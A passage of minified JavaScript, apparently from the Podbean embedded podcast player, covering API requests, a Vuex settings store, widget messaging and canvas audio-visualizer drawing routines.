      return q = Object(s["a"])(regeneratorRuntime.mark(function t(e, a) {
        var o, n;
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              return o = Object({
                NODE_ENV: "production",
                BASE_URL: "/player-v2/"
              }).VUE_APP_BASE_URL, o || (o = "https://" + window.location.host + "/player/"), t.prev = 2, console.log(o + e, a), t.next = 6, B.get(o + e, {
                params: a
              });
            case 6:
              return n = t.sent, t.abrupt("return", n.data);
            case 10:
              if (t.prev = 10, t.t0 = t["catch"](2), console.error(t.t0.message), !t.t0.response || "wwwsite\\exceptions\\PlayerNoRightsException" !== t.t0.response.data.type) {
                t.next = 19;
                break;
              }
              J.commit(b, ["error", "Unauthorized"]), J.commit(b, ["errorLogo", t.t0.response.data.logo]), J.commit(b, ["errorLoginUrl", t.t0.response.data.loginUrl]), t.next = 26;
              break;
            case 19:
              if (!t.t0.response || 401 !== t.t0.response.status) {
                t.next = 24;
                break;
              }
              throw J.commit(b, ["error", "Unauthorized"]), new Error("Request failed ,please try again.");
            case 24:
              throw J.commit(b, ["error", "Player loading failed."]), new Error("Request failed ,please try again.");
            case 26:
            case "end":
              return t.stop();
          }
        }, t, null, [[2, 10]]);
      })), q.apply(this, arguments);
    }
    function H(t, e, a) {
      if (J.state.setting.engagementStatsBaseUrl && !(a - e < 3)) {
        var o = Mt(),
          n = J.state.setting.engagementStatsBaseUrl + "&s=".concat(e, "&e=").concat(a, "&v=").concat(o, "&eid=").concat(t);
        "undefined" !== typeof navigator.sendBeacon ? navigator.sendBeacon(n + "&beacon=1") : B.get(n, {});
      }
    }
    function N(t) {
      return U.apply(this, arguments);
    }
    function U() {
      return U = Object(s["a"])(regeneratorRuntime.mark(function t(e) {
        var a, o, n;
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              return t.prev = 0, t.next = 3, B.get(e);
            case 3:
              return a = t.sent, o = $t(a.data), n = new Blob([o], {
                type: "text/vtt"
              }), t.abrupt("return", URL.createObjectURL(n));
            case 9:
              t.prev = 9, t.t0 = t["catch"](0);
            case 11:
              return t.abrupt("return", null);
            case 12:
            case "end":
              return t.stop();
          }
        }, t, null, [[0, 9]]);
      })), U.apply(this, arguments);
    }
    function F(t) {
      return V.apply(this, arguments);
    }
    function V() {
      return V = Object(s["a"])(regeneratorRuntime.mark(function t(e) {
        var a;
        return regeneratorRuntime.wrap(function (t) {
          while (1) switch (t.prev = t.next) {
            case 0:
              return t.prev = 0, t.next = 3, B.get(e);
            case 3:
              if (a = t.sent, "object" === Object(h["a"])(a.data.chapters)) {
                t.next = 6;
                break;
              }
              return t.abrupt("return", []);
            case 6:
              return t.abrupt("return", a.data.chapters);
            case 9:
              t.prev = 9, t.t0 = t["catch"](0);
            case 11:
              return t.abrupt("return", null);
            case 12:
            case "end":
              return t.stop();
          }
        }, t, null, [[0, 9]]);
      })), V.apply(this, arguments);
    }
    Object($["a"])(B, {
      shouldResetTimeout: !0,
      retryCondition: function (t) {
        return "wwwsite\\exceptions\\PlayerNoRightsException" !== t.response.data.type && (Object($["b"])(t) || "ECONNABORTED" === t.code);
      },
      retryDelay: function (t) {
        return 1e3 * t;
      }
    });
    var W,
      G,
      K = {
        1: "#f6f6f6",
        2: "#1b1b1b",
        3: "#3267a3",
        4: "#60a0c8",
        5: "#2baf9e",
        6: "#3ab278",
        7: "#8bbb4e",
        8: "#ff6d00",
        9: "#c73a3a",
        10: "#956f46",
        11: "#654771",
        12: "#666666",
        13: "#fb0584"
      };
    o["a"].use(d["a"]);
    var J = new d["a"].Store({
      state: {
        setting: null,
        episodes: null,
        error: null,
        errorLogo: null,
        errorLoginUrl: null,
        current: null,
        skin: 1,
        btnSkin: 7,
        download: 1,
        share: 1,
        rtl: 0,
        logoLink: "episode_page",
        fonts: "Helvetica",
        startAt: 0,
        square: 0,
        mini: 0,
        showAppDownloadStatus: 0,
        start: 0,
        stop: 0,
        recordedFFTData: [],
        playing: !1,
        playerLoading: !1,
        playerLoaded: !1,
        playerError: !1,
        playerPlaying: !1,
        screenshotImg: "",
        playbackRate: 1,
        playbackRateIndex: 1,
        podcastApps: [],
        rssPageLink: null,
        customCssLink: null,
        customCss: null,
        playerColor: null,
        playerBtnColor: null,
        fontColor: null,
        fontColorInput: null,
        miniOnlyPlay: 0,
        chapters: [],
        cssVersion: Math.floor(1e9 * Math.random()).toString(16)
      },
      mutations: (W = {}, Object(m["a"])(W, b, function (t, e) {
        var a = Object(R["a"])(e, 2),
          o = a[0],
          n = a[1];
        t[o] = n, "current" === o && ("mediaSession" in navigator && J.getters.episode && J.getters.episode.logo && (navigator.mediaSession.metadata = new window.MediaMetadata({
          title: J.getters.episode.title,
          artist: t.setting.author,
          album: t.setting.podcastTitle,
          artwork: [{
            sizes: "300x300",
            src: J.getters.episode.logo
          }]
        })), J.dispatch(x));
      }), Object(m["a"])(W, y, function (t, e) {
        var a = Object(R["a"])(e, 2),
          o = a[0],
          n = a[1];
        t[o].push(n);
      }), W),
      getters: {
        episode: function (t) {
          return t.episodes && t.episodes[t.current];
        },
        skinColor: function (t) {
          return t.playerColor ? t.playerColor : K[t.skin];
        },
        btnSkinColor: function (t) {
          return t.playerBtnColor ? t.playerBtnColor : K[t.btnSkin];
        }
      },
      actions: (G = {}, Object(m["a"])(G, x, function (t) {
        return Object(s["a"])(regeneratorRuntime.mark(function e() {
          var a, o;
          return regeneratorRuntime.wrap(function (e) {
            while (1) switch (e.prev = e.next) {
              case 0:
                if (a = t.commit, t.state, o = [], !J.getters.episode || !J.getters.episode.chaptersUrl) {
                  e.next = 6;
                  break;
                }
                return e.next = 5, F(J.getters.episode.chaptersUrl);
              case 5:
                o = e.sent;
              case 6:
                a(b, ["chapters", o]);
              case 7:
              case "end":
                return e.stop();
            }
          }, e);
        }))();
      }), Object(m["a"])(G, C, function (t) {
        return Object(s["a"])(regeneratorRuntime.mark(function e() {
          var a, o;
          return regeneratorRuntime.wrap(function (e) {
            while (1) switch (e.prev = e.next) {
              case 0:
                a = t.commit, o = t.state, o.current + 1 >= o.episodes.length || a(b, ["current", o.current + 1]);
              case 2:
              case "end":
                return e.stop();
            }
          }, e);
        }))();
      }), Object(m["a"])(G, _, function (t) {
        return Object(s["a"])(regeneratorRuntime.mark(function e() {
          var a, o;
          return regeneratorRuntime.wrap(function (e) {
            while (1) switch (e.prev = e.next) {
              case 0:
                a = t.commit, o = t.state, o.current - 1 >= 0 ? a(b, ["current", o.current - 1]) : a(b, ["current", o.episodes.length - 1]);
              case 2:
              case "end":
                return e.stop();
            }
          }, e);
        }))();
      }), Object(m["a"])(G, k, function (t) {
        return Object(s["a"])(regeneratorRuntime.mark(function e() {
          var a, o, n, r, s, i, c, l, d, p, u, h, f, m, g, v, w, y, k, x, P, S, O, E, T, j, L, A, D, M, R, $, I, B, q, H;
          return regeneratorRuntime.wrap(function (e) {
            while (1) switch (e.prev = e.next) {
              case 0:
                if (a = t.commit, !Ot("debug_loading")) {
                  e.next = 3;
                  break;
                }
                return e.abrupt("return");
              case 3:
                if (o = Ot("media") || "", n = Ot("i"), r = Ot("scode") || "", s = Ot("pfauth") || "", "0" === Ot("pbad"), i = Ot("order"), c = Ot("limit"), l = Ot("filter"), d = Ot("publish_start"), p = Ot("publish_end"), u = Ot("season"), h = Ot("tag"), f = Ot("ss"), m = parseInt(Ot("mini")) || 0, g = Ot("skin"), w = {
                  1: "f6f6f6",
                  2: "1b1b1b",
                  3: "3267a3",
                  4: "60a0c8",
                  5: "2baf9e",
                  6: "3ab278",
                  7: "8bbb4e",
                  8: "ff6d00",
                  9: "c73a3a",
                  10: "956f46",
                  11: "654771",
                  12: "666666",
                  13: "fb0584"
                }, g && (g.length <= 2 ? (g = parseInt(g) || 1, g = w[g] || w[1]) : (g.length > 6 || !/^\w+$/.test(g)) && (g = w[1]), v = "#" + g), y = Ot("btn-skin"), y && (y.length <= 2 ? (y = parseInt(y) || 7, y = w[y] || w[7]) : (y.length > 6 || !/^\w+$/.test(y)) && (y = w[7]), k = "#" + y), x = Ot("font-color"), (x && 6 !== x.length || !/^\w+$/.test(x)) && (x = null), P = Ut(x, v), S = parseInt(Ot("square")) || 0, a(b, ["square", S]), e.prev = 27, !o) {
                  e.next = 48;
                  break;
                }
                if (E = Ot("p") || "", T = Ot("e") || "", j = Ot("t") || "", L = Ot("et") || "", A = Ot("pt") || "", D = Ot("au") || "", M = Ot("l") || "", R = Ot("f") || "", $ = Ot("s") || "", I = Ot("transcripts") || "", B = Ot("egt"), qt("".concat(o, "-").concat(E, "-").concat(T, "-").concat(j, "-").concat(L, "-").concat(A, "-").concat(D, "-").concat(M, "-").concat(R, "-").concat(I, "-pb20210519vcx_mini")) === $) {
                  e.next = 42;
                  break;
                }
                throw new Error("Invalid params");
              case 42:
                O = {
                  setting: {
                    podcastTitle: A,
                    podcastLink: "https://www.podbean.com",
                    author: D,
                    engagementStatsBaseUrl: B
                  },
                  episodes: [{
                    id: T,
                    title: L,
                    protectedLevel: "public",
                    resource: o,
                    resourceMimetype: zt(o),
                    type: "audio",
                    logo: M,
                    enableWave: !1,
                    enableSpeed: !1,
                    crossorigin: "anonymous",
                    transcripts_url: I
                  }],
                  podcastApps: []
                }, m = 1, y = g, k = v, e.next = 51;
                break;
              case 48:
                return e.next = 50, z(n, {
                  scode: r,
                  pfauth: s,
                  referrer: document.referrer,
                  order: i,
                  limit: c,
                  filter: l,
                  publish_start: d,
                  publish_end: p,
                  season: u,
                  tag: h,
                  ss: f,
                  touchable: navigator.maxTouchPoints > 1,
                  type: -1 !== n.indexOf("-playlist") ? "playlist" : 1 === S ? "stylish" : "classic"
                });
              case 50:
                O = e.sent;
              case 51:
                e.next = 57;
                break;
              case 53:
                return e.prev = 53, e.t0 = e["catch"](27), a(b, ["error", "www.podbean.com refused to connect"]), e.abrupt("return");
              case 57:
                return e.prev = 57, q = document.getElementById("global-loading"), H = document.getElementById("mask-logo"), H.addEventListener("animationiteration", function () {
                  q.style.opacity = 0, H.classList.remove("on");
                }, !1), q.addEventListener("transitionend", function () {
                  q.style.display = "none";
                }, !1), e.finish(57);
              case 63:
                O && (a(b, ["episodes", O.episodes]), a(b, ["setting", O.setting]), a(b, ["screenshotImg", O.screenshotImg]), a(b, ["podcastApps", O.podcastApps]), a(b, ["rssPageLink", O.rssPageLink]), a(b, ["customCssLink", O.customCssLink])), a(b, ["skin", g]), a(b, ["btnSkin", y]), a(b, ["playerColor", v]), a(b, ["playerBtnColor", k]), a(b, ["fontColor", P]), a(b, ["fontColorInput", x]), Ot("download") ? a(b, ["download", parseInt(Ot("download"))]) : a(b, ["download", 1]), Ot("download") ? a(b, ["share", parseInt(Ot("share"))]) : a(b, ["share", 1]), a(b, ["rtl", parseInt(Ot("rtl")) || 0]), a(b, ["logoLink", Ot("logo_link") || "episode_page"]), a(b, ["fonts", Ot("fonts") || "Helvetica"]), a(b, ["startAt", parseInt(Ot("start_at")) || 0]), a(b, ["mini", m]), a(b, ["current", 0]), a(b, ["miniOnlyPlay", parseInt(Ot("mini-only-play")) || 0]), "mediaSession" in navigator && O && O.episodes.length > 1 && (navigator.mediaSession.setActionHandler("previoustrack", function () {
                  J.dispatch(_);
                }), navigator.mediaSession.setActionHandler("nexttrack", function () {
                  J.dispatch(C);
                }));
              case 80:
              case "end":
                return e.stop();
            }
          }, e, null, [[27, 53, 57, 63]]);
        }))();
      }), G)
    });
    window.addEventListener("message", function (t) {
      if ("object" === Object(h["a"])(t.data) && t.data.action && -1 !== t.data.action.search("PB.Widget.API.")) try {
        var e = t.data.action.replace("PB.Widget.API.", "");
        switch (e) {
          case "CHANGE_PARAMS":
            if (-1 === ["skin", "btn-skin", "download", "share", "rtl", "fonts", "font-color"].indexOf(t.data.key)) return;
            var a = t.data.key,
              o = t.data.value;
            if (-1 !== ["download", "share", "rtl"].indexOf(t.data.key)) o = parseInt(o);else if ("skin" === t.data.key) {
              var n = null;
              o.length <= 2 ? o = parseInt(o) : o.length <= 6 && /^\w+$/.test(o) ? (J.commit(b, ["playerColor", "#" + o]), n = "#" + o) : o = 1;
              var r = Ut(J.state.fontColorInput, n);
              J.commit(b, ["fontColor", r]);
            } else "btn-skin" === t.data.key ? o.length <= 2 ? o = parseInt(o) : o.length <= 6 && /^\w+$/.test(o) ? J.commit(b, ["playerBtnColor", "#" + o]) : o = 7 : "font-color" === a && (a = "fontColor", 6 === o.length && /^\w+$/.test(o) || (o = null), J.commit(b, ["fontColorInput", o]), o = Ut(o, J.state.playerColor));
            "btn-skin" === a && (a = "btnSkin"), J.commit(b, [a, o]);
            break;
          case "CHANGE_CUSTOM_CSS":
            J.commit(b, ["customCss", t.data.value]);
            break;
        }
      } catch (s) {
        console.error(s);
      }
    });
    var X = function (t) {
      var e = t.data,
        a = t.ctx,
        o = t.pixelRatio,
        n = t.initialWidth,
        r = t.initialHeight,
        s = Y(),
        i = r / 255,
        c = n / s,
        l = 2;
      a.lineWidth = l * o, a.strokeStyle = J.state.playing ? J.getters.btnSkinColor : "#cccccc";
      for (var d = 1; d <= s; d++) {
        var p = e[d];
        p *= i;
        var u = c * d;
        a.moveTo(Q(l, u, o), Q(l, r, o)), a.lineTo(Q(l, u, o), Q(l, r - p, o)), a.stroke(), a.beginPath();
      }
    };
    function Y() {
      return window.innerWidth / 6;
    }
    function Q(t, e, a) {
      return t % 2 === 0 ? e : e + a / 2;
    }
    var Z = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = n / 255, i = r / 128, c = 128, l = 5, d = Math.floor(c / a.colors.length), p = 1; p <= c; p++) {
          var u = e[p];
          u += l, u *= s;
          var h = i * p,
            f = n / 2 + u / 2;
          if (o.moveTo(h, f), o.lineTo(h, f - u), p % d === 0) {
            var m = p / d - 1;
            o.strokeStyle = a.colors[m], o.stroke(), o.beginPath();
          }
        }
      },
      tt = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "organize").mids, e = c.mutateData(e, "split", 2)[0], e = c.mutateData(e, "shrink", 100), e = c.mutateData(e, "mirror"), e = c.mutateData(e, "scale", n), e = c.mutateData(e, "amp", .75);
        var l = c.getPoints("line", r, [0, n / 2], e.length, e, {
          offset: 50
        });
        l.start.forEach(function (t, e) {
          c.drawLine(t, l.end[e], {
            lineColor: i[0]
          }), c.drawCircle(t, .01 * n, {
            color: i[1] || i[0]
          }), c.drawCircle(l.end[e], .01 * n, {
            color: i[1] || i[0]
          });
        });
      },
      et = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = 5, i = n / 4, c = i / 2, l = r / 2, d = n / 2, p = 128, u = (i - c) / 255, h = 360 / p * Math.PI / 180, f = Math.floor(p / a.colors.length), m = 1; m <= p; m++) {
          var g = (e[m] + s) * u,
            v = m * h,
            w = l + (i - (g - c)) * Math.cos(v),
            b = d + (i - (g - c)) * Math.sin(v);
          o.moveTo(w, b);
          var y = l + (i + g) * Math.cos(v),
            k = d + (i + g) * Math.sin(v);
          if (o.lineTo(y, k), m % f === 0) {
            var C = m / f - 1;
            o.strokeStyle = a.colors[C], o.stroke(), o.beginPath();
          }
        }
        o.stroke();
      },
      at = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = n / 4, i = r / 2, c = n / 2, l = 56, d = s / 255, p = 360 / l * Math.PI / 180, u = 1; u <= l; u++) {
          var h = e[u] * d,
            f = u * p,
            m = i + (s - h / 2) * Math.cos(f),
            g = c + (s - h / 2) * Math.sin(f);
          o.moveTo(m, g);
          var v = i + (s + h) * Math.cos(f),
            w = c + (s + h) * Math.sin(f);
          o.lineTo(v, w);
          var b = i + (s + h) * Math.cos(f + p),
            y = c + (s + h) * Math.sin(f + p);
          o.lineTo(b, y);
          var k = i + (s - h / 2) * Math.cos(f + p),
            C = c + (s - h / 2) * Math.sin(f + p);
          o.lineTo(k, C), o.lineTo(m, g);
        }
        a.colors[1] && (o.fillStyle = a.colors[1], o.fill()), o.stroke();
      },
      ot = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = n / 255, i = r / 64, c = 0; c < 64; c++) {
          var l = e[c];
          l *= s;
          var d = i * c;
          o.rect(d, n, i, -l);
        }
        o.fillStyle = a.colors[1] || a.colors[0], o.stroke(), o.fill();
      },
      nt = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = n / 255, i = r / 50, c = 0; c <= 50; c++) {
          var l = e[c];
          l *= s;
          var d = i * c;
          o.rect(d, n / 2 + l / 2, i, -l);
        }
        a.colors[1] && (o.fillStyle = a.colors[1], o.fill()), o.stroke();
      },
      rt = function (t) {
        for (var e = t.data, a = t.options, o = t.ctx, n = t.h, r = t.w, s = n / 4, i = s / 4, c = r / 2, l = n / 2, d = 120, p = (s - i - 35) / 255, u = 360 / d * Math.PI / 180, h = [], f = [], m = 1; m <= d; m++) {
          var g = e[200 % m] * p,
            v = m * u,
            w = c + (s - g + i) * Math.cos(v),
            b = l + (s - g + i) * Math.sin(v);
          o.moveTo(w, b), f.push({
            x: w,
            y: b
          });
          var y = c + (s + g + i) * Math.cos(v),
            k = l + (s + g + i) * Math.sin(v);
          o.lineTo(y, k), h.push({
            x: y,
            y: k
          });
        }
        for (var C in o.moveTo(h[0].x, h[0].y), h) C = h[C], o.lineTo(C.x, C.y);
        o.closePath(), o.moveTo(f[0].x, f[0].y);
        for (var _ = f.length - 1; _ >= 0; _++) _ = f[_], o.lineTo(_.x, _.y);
        for (var x in o.closePath(), a.colors[1] && (o.fillStyle = a.colors[1], o.fill()), o.stroke(), o.beginPath(), o.moveTo(f[0].x, f[0].y), f) x = f[x], o.lineTo(x.x, x.y);
        o.closePath(), a.colors[2] && (o.fillStyle = a.colors[2], o.fill()), o.stroke();
      },
      st = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = n / 4,
          i = r / 2,
          c = n / 2,
          l = 100,
          d = s / 255,
          p = 360 / l * Math.PI / 180,
          u = 0,
          h = i + (s + u) * Math.cos(0),
          f = c + (s + u) * Math.sin(0);
        o.moveTo(h, f);
        for (var m = 1; m <= l; m++) {
          var g = e[350 % m] * d,
            v = m * p,
            w = i + (s + g) * Math.cos(v),
            b = c + (s + g) * Math.sin(v);
          o.lineTo(w, b);
        }
        o.closePath(), o.stroke(), a.colors[1] && (o.fillStyle = a.colors[1], o.fill());
      },
      it = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o),
          l = n < r ? n : r;
        e = c.mutateData(e, "organize"), e = [e.mids, e.vocals], e[0] = c.mutateData(e[0], "scale", l / 4), e[1] = c.mutateData(e[1], "scale", l / 8), e[0] = c.mutateData(e[0], "shrink", .2), e[0] = c.mutateData(e[0], "split", 2)[0], e[0] = c.mutateData(e[0], "reverb"), e[1] = c.mutateData(e[1], "reverb");
        var d = c.getPoints("circle", l / 2, [r / 2, n / 2], e[0].length, e[0]),
          p = c.getPoints("circle", l / 4, [r / 2, n / 2], e[1].length, e[1]);
        c.drawPolygon(d.end, {
          close: !0,
          radius: 4,
          lineColor: i[0],
          color: i[1]
        }), c.drawPolygon(p.end, {
          close: !0,
          radius: 4,
          lineColor: i[2],
          color: i[3]
        });
        var u = (l / 4 + l / 2) / 2,
          h = e[1] = c.mutateData(e[1], "scale", l / 4 - l / 2),
          f = c.getPoints("circle", u, [r / 2, n / 2], e[1].length, h);
        f.start.forEach(function (t, e) {
          c.drawLine(t, f.end[e], {
            lineColor: i[4] || i[2]
          });
        });
      },
      ct = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o),
          l = n < r ? n : r;
        e = c.mutateData(e, "organize"), e.vocals = c.mutateData(e.vocals, "scale", l / 2 / 2), e.base = c.mutateData(e.base, "scale", l / 2 / 2);
        var d = c.getPoints("circle", l / 2, [r / 2, n / 2], e.vocals.length, e.vocals),
          p = c.getPoints("circle", l / 2, [r / 2, n / 2], e.vocals.length, e.vocals, {
            offset: 100
          }),
          u = c.getPoints("circle", l / 2, [r / 2, n / 2], e.base.length, e.base, {
            offset: 100
          });
        d.start.forEach(function (t, e) {
          c.drawLine(t, d.end[e], {
            lineColor: i[0]
          });
        }), c.drawPolygon(p.start, {
          close: !0,
          lineColor: i[1],
          color: i[3],
          radius: 5
        }), c.drawPolygon(u.start, {
          close: !0,
          lineColor: i[2],
          color: i[4],
          radius: 5
        });
      },
      lt = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "organize").base, e = c.mutateData(e, "shrink", 20).slice(0, 19), e = c.mutateData(e, "scale", n);
        var l = c.getPoints("line", r, [0, n], e.length, e),
          d = 5,
          p = r / 20 - d,
          u = 0;
        l.start.forEach(function (t, a) {
          for (var o = Math.ceil(e[a] / p), r = (n - d * (n / p)) / p, s = Math.ceil(r / i.length), l = 1; l <= o; l++) {
            var h = [t[0], t[1] - p * l - d * l];
            c.drawSquare(h, p, {
              color: i[u],
              lineColor: "black"
            }), l % s == 0 && (u++, u >= i.length && (u = i.length - 1));
          }
          u = 0;
        });
      },
      dt = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "organize").vocals, e = c.mutateData(e, "shrink", 10), e = c.mutateData(e, "scale", n), e = c.mutateData(e, "amp", 1);
        var l = c.getPoints("line", r, [0, n / 2], e.length, e, {
            offset: 50
          }),
          d = 0,
          p = Math.ceil(e.length / i.length);
        l.start.forEach(function (t, a) {
          (a + 1) % p == 0 && d++, c.drawRectangle(t, e[a], r / e.length, {
            color: i[d]
          });
        });
      },
      pt = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "shrink", 300), e = c.mutateData(e, "scale", n / 2), e = c.mutateData(e, "split", 4).slice(0, 3);
        var l = 0;
        e.forEach(function (t) {
          var e = c.getPoints("line", r, [0, n / 2], t.length, t);
          c.drawPolygon(e.end, {
            lineColor: i[l],
            radius: .015 * n
          });
          var a = c.getPoints("line", r, [0, n / 2], t.length, t, {
            offset: 100
          });
          c.drawPolygon(a.start, {
            lineColor: i[l],
            radius: .015 * n
          }), l++;
        });
      },
      ut = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o);
        e = c.mutateData(e, "shrink", 200).slice(0, 120), e = c.mutateData(e, "mirror"), e = c.mutateData(e, "scale", n / 4 + n / 4 * .35);
        var l = c.getPoints("circle", n / 2, [r / 2, n / 2], e.length, e, {
          offset: 35,
          rotate: 270
        });
        l.start.forEach(function (t, e) {
          c.drawLine(t, l.end[e]);
        }), c.drawPolygon(l.start, {
          close: !0
        }), l.end.forEach(function (t, e) {
          c.drawCircle(t, .01 * n, {
            color: i[0]
          });
        });
      },
      ht = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = (a.colors, new s(o));
        e = i.mutateData(e, "shrink", 1 / 8), e = i.mutateData(e, "split", 2)[0], e = i.mutateData(e, "scale", n);
        var c = i.getPoints("line", r, [0, n / 2], e.length, e, {
            offset: 50
          }),
          l = null;
        c.start.forEach(function (t, e) {
          l && i.drawLine(l, t), i.drawLine(t, c.end[e]), l = c.end[e];
        });
      },
      ft = function (t) {
        var e = t.data,
          a = t.options,
          o = t.ctx,
          n = t.h,
          r = t.w,
          s = t.Helper,
          i = a.colors,
          c = new s(o),
          l = n < r ? n : r;
        e = c.mutateData(e, "shrink", 100), e = c.mutateData(e, "split", 2)[0], e = c.mutateData(e, "scale", n / 4);
        var d = e,
          p = c.getPoints("circle", l / 2, [r / 2, n / 2], e.length, e);
        c.drawPolygon(p.end, {
          close: !0
        }), p.start.forEach(function (t, e) {
          c.drawLine(t, p.end[e]);
        }), e = c.mutateData(e, "scale", .7), p = c.getPoints("circle", l / 2, [r / 2, n / 2], e.length, e), c.drawPolygon(p.end, {
          close: !0
        }), e = c.mutateData(e, "scale", .3), p = c.getPoints("circle", l / 2, [r / 2, n / 2], e.length, e), c.drawPolygon(p.end, {
          close: !0
        }), c.drawCircle([r / 2, n / 2], l / 2, {
          color: i[2]
        }), d = c.mutateData(d, "scale", 1.4), p = c.getPoints("circle", l / 2, [r / 2, n / 2], d.length, d), p.end.forEach(function (t, e) {
          c.drawCircle(t, .01 * l, {
            color: i[1],
            lineColor: i[1] || i[0]
          });
        });
      },
      mt = function (t) {
        var e = t.data,
          a = t.ctx,
          o = t.h,
          n = t.w,
          r = t.Helper,
          s = new r(a),
          i = o < n ? o : n;
        e = s.mutateData(e, "shrink", 200), e = s.mutateData(e, "split", 2)[0], e = s.mutateData(e, "scale", o / 2);
        var c = s.getPoints("circle", i / 2, [n / 2, o / 2], e.length, e, {
          offset: 50
        });
        s.drawPolygon(c.end, {
          close: !0
        }), s.drawPolygon(c.start, {
          close: !0
        });
        for (var l = 0; l < c.start.length; l += 1) {
          var d = c.start[l];
          l++;
          var p = c.end[l] || c.end[0];
          s.drawLine(d, p), s.drawLine(p, c.start[l + 1] || c.start[0]);
        }
      },
      gt = function () {};
    function vt(t, e) {
      var a = this,
        o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
        n = arguments.length > 3 ? arguments[3] : void 0;
      o = Object(i["a"])({}, o), o.stroke || (o.stroke = 1), o.colors || (o.colors = ["#d92027", "#ff9234", "#ffcd3c", "#35d0ba"]);
      var r = document.getElementById(e);
      if (r) {
        r.width = r.clientWidth, r.height = r.clientHeight;
        var s = r.getContext("2d"),
          c = wt(s),
          l = r.clientWidth * c,
          d = r.clientHeight * c,
          p = l * c,
          u = d * c;
        p !== s.canvas.width && (s.canvas.width = p), u !== s.canvas.height && (s.canvas.height = u), s.setTransform(c, 0, 0, c, 0, 0), s.strokeStyle = o.colors[0], s.lineWidth = o.stroke;
        var h = {
            bars: X,
            "bars blocks": ot,
            "big bars": dt,
            cubes: lt,
            dualbars: Z,
            "dualbars blocks": nt,
            fireworks: ut,
            flower: et,
            "flower blocks": at,
            orbs: tt,
            ring: M,
            rings: it,
            "round layers": gt,
            "round wave": st,
            shine: D,
            "shine rings": ct,
            shockwave: pt,
            star: rt,
            static: ht,
            stitches: mt,
            wave: A,
            web: ft
          },
          f = {
            bars: 1,
            "bars blocks": 1,
            "big bars": 1,
            cubes: 1,
            dualbars: 1,
            "dualbars blocks": 1,
            fireworks: 1,
            flower: 1,
            "flower blocks": 1,
            ring: 1,
            rings: 1,
            "round layers": 1,
            "round wave": 1,
            orbs: 1,
            shine: 1,
            "shine rings": 1,
            shockwave: 1,
            star: 1,
            static: 1,
            stitches: 1,
            wave: 1,
            web: 1
          };
        "string" == typeof o.type && (o.type = [o.type]), o.type.forEach(function (i) {
          if (n % f[i] === 0) {
            var p = r.height,
              u = r.width,
              m = {
                data: t,
                options: o,
                ctx: s,
                h: p,
                w: u,
                Helper: a.Helper,
                canvasId: e,
                pixelRatio: c,
                initialWidth: l,
                initialHeight: d
              };
            s.clearRect(0, 0, u, p), s.beginPath(), h[i](m);
          }
        });
      }
    }
    function wt(t) {
      var e = window.devicePixelRatio || 1,
        a = t.webkitBackingStorePixelRatio || t.mozBackingStorePixelRatio || t.msBackingStorePixelRatio || t.oBackingStorePixelRatio || t.backingStorePixelRatio || 1;
      return e / a;
    }
    var bt = a("2909");
    function yt(t) {
      this.ctx = t, this.mainColor = "black";
    }
    yt.prototype = {
      __toRadians__: function (t) {
        return t * Math.PI / 180;
      },
      __rotatePoint__: function (t, e, a) {
        var o = Object(R["a"])(t, 2),
          n = o[0],
          r = o[1],
          s = Object(R["a"])(e, 2),
          i = s[0],
          c = s[1],
          l = this.__toRadians__(a),
          d = Math.cos(l) * (n - i) - Math.sin(l) * (r - c) + i,
          p = Math.sin(l) * (n - i) + Math.cos(l) * (r - c) + c;
        return [d, p];
      },
      mutateData: function (t, e) {
        var a = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : null;
        if ("mirror" === e) {
          for (var o = [], n = 0; n < t.length; n += 2) o.push(t[n]);
          return o = [].concat(Object(bt["a"])(o), Object(bt["a"])(o.reverse())), o;
        }
        if ("shrink" === e) {
          a < 1 && (a = t.length * a);
          for (var r = [], s = Math.floor(t.length / a), i = 1; i <= a; i++) {
            var c = t.slice(i * s, i * s + s),
              l = c[Math.floor(c.length / 2)];
            r.push(l);
          }
          return r;
        }
        if ("split" === e) {
          for (var d = Math.floor(t.length / a), p = [], u = [], h = 0, f = 0; f <= d * a; f++) h === d && (p.push(u), u = [], h = 0), u.push(t[f]), h++;
          return p;
        }
        if ("scale" === e) {
          var m = a / 255;
          a <= 3 && a >= 0 && (m = a);
          var g = t.map(function (t) {
            return t * m;
          });
          return g;
        }
        if ("organize" === e) {
          var v = {};
          return v.base = t.slice(60, 120), v.vocals = t.slice(120, 255), v.mids = t.slice(255, 2e3), v;
        }
        if ("reverb" === e) {
          var w = [];
          return t.forEach(function (e, a) {
            w.push(e - (t[a + 1] || 0));
          }), w;
        }
        if ("amp" === e) {
          var b = [];
          return t.forEach(function (t) {
            b.push(t * (a + 1));
          }), b;
        }
